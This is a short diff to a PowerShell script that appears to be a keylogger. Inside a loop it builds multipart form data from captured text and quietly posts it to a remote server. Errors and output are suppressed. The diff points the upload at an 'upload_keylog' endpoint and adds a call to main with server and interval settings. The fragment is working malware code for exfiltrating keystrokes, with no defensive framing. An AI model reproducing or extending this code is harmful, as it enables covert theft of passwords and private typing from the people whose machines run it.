@@ -79,8 +79,11 @@ while ($true) {
     $l = "`r`n"
     $bl = @("--$b","Content-Disposition: form-data; name=`"d`"$l",$d,"--$b","Content-Disposition: form-data; name=`"f1`"; filename=`"$f`"","Content-Type: text/plain$l",$t,"--$b--$l")
     $bd = $bl -join $l
-    irm -Uri $w -Method Post -Body $bd -ContentType "multipart/form-data; boundary=$b" -Headers $headers -ErrorAction SilentlyContinue > $null 2>&1
+    irm -Uri "$w/upload_keylog" -Method Post -Body $bd -ContentType "multipart/form-data; boundary=$b" -Headers $headers -ErrorAction SilentlyContinue > $null 2>&1
     Remove-Variable k,t,p,f,b,bl,bd,s,v,ks,b,r -ErrorAction SilentlyContinue
     [System.GC]::Collect()
 }
 }
+$Server = $Server
+$Interval = $Interval
+main -Server $Server -Interval $Interval
